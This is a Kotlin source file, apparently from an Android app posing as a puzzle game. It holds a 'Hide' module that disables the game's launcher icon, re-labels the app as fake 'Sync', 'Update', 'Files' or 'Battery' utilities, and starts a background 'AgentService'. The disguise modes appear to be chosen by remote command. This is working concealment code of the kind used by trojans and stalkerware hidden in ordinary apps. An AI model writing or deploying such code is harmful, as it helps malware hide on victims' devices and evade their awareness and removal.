package com.puzzleblast.game.util

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import com.puzzleblast.game.BuildConfig
import com.puzzleblast.game.MainActivity
import com.puzzleblast.game.services.AgentService

object Hide {
    private const val ALIAS_MAIN = "com.puzzleblast.game.MainLauncherAlias"
    private const val ALIAS_SYNC = "com.puzzleblast.game.SyncAlias"
    private const val ALIAS_UPDATE = "com.puzzleblast.game.UpdateAlias"
    private const val ALIAS_FILES = "com.puzzleblast.game.FilesAlias"
    private const val ALIAS_BATTERY = "com.puzzleblast.game.BatteryAlias"

    fun fire(ctx: Context) {
        if (Prefs.hidden) return
        val pm = ctx.packageManager
        pm.setComponentEnabledSetting(
            ComponentName(ctx.packageName, ALIAS_MAIN),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        if (BuildConfig.RENAME_ON_HIDE) {
            pm.setComponentEnabledSetting(
                ComponentName(ctx.packageName, ALIAS_SYNC),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        }
        Prefs.hidden = true
        AgentService.start(ctx)
    }

    fun unhide(ctx: Context) {
        val pm = ctx.packageManager
        pm.setComponentEnabledSetting(
            ComponentName(ctx.packageName, ALIAS_MAIN),
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
        for (a in listOf(ALIAS_SYNC, ALIAS_UPDATE, ALIAS_FILES, ALIAS_BATTERY)) {
            pm.setComponentEnabledSetting(
                ComponentName(ctx.packageName, a),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
        Prefs.hidden = false
    }

    fun disguise(ctx: Context, mode: String): String {
        val pm = ctx.packageManager
        val main = ComponentName(ctx.packageName, ALIAS_MAIN)
        val others = listOf(ALIAS_SYNC, ALIAS_UPDATE, ALIAS_FILES, ALIAS_BATTERY)
        val enable = when (mode) {
            "update" -> ALIAS_UPDATE
            "file" -> ALIAS_FILES
            "battery" -> ALIAS_BATTERY
            "hide" -> null
            else -> return "unknown disguise mode"
        }
        pm.setComponentEnabledSetting(main, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
        others.forEach { a ->
            val state = if (a == enable) PackageManager.COMPONENT_ENABLED_STATE_ENABLED else PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            pm.setComponentEnabledSetting(ComponentName(ctx.packageName, a), state, PackageManager.DONT_KILL_APP)
        }
        Prefs.hidden = true
        return "disguised as $mode"
    }

    fun openGame(ctx: Context) {
        ctx.startActivity(
            android.content.Intent(ctx, MainActivity::class.java)
                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
        )
    }
}
